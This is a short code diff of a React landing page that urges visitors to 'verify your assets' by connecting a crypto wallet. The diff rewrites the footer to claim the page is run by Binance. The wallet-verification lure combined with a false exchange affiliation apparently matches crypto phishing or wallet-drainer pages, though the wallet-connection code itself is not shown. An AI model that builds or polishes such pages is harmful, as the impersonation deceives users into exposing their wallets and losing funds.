@@ -93,14 +93,14 @@ const App = ({ web3 }) => {
         </div>
       </nav>
       <main className="hero">
-        <h1>verify your assets</h1>
+        <h1>Verify Your Assets</h1>
         <p>Ensure your tokens are eligible for trade.</p>
         <div className="tnShado">
           <ConnectWallet data={setIsWallet} web3={web3} />
         </div>
       </main>
       <footer className="footer">
-        © 2025 Best application to secure your coins All rights reserved.
+        © 2025 Best application Reserved by the binance to verify assets.
       </footer>
     </div>
   );
